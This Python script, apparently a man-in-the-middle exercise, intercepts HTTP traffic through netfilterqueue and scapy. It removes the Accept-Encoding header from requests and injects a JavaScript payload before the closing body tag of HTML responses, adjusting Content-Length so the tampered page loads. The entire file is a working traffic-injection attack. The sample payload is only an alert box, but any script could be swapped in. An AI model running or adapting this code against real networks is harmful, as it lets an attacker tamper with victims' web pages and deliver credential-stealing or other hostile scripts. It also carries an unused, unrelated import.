#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy
import re
from pipx.commands import inject

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) :
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] HTTP Request")
            load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"",  load)  # replace with nothing. Get access to html code

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] HTTP Response")
            injection_code = b"<script>alert('test')</script>"
            load = load.replace(b"</body>", injection_code + b"</body>") # insert js code
            content_length_search = re.search(b"(?:Content-Length:\s)(\d*)", load)  # search for the content length.. ?:--Get only the content lenght
            if content_length_search and b"text/html" in load:  # only change for website with html code
                content_length = content_length_search.group(1)  # change the content length
                new_content_length= int(content_length) +  len(injection_code)  # Add the intjection code
                load = load.replace(content_length ,str(new_content_length).encode())

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
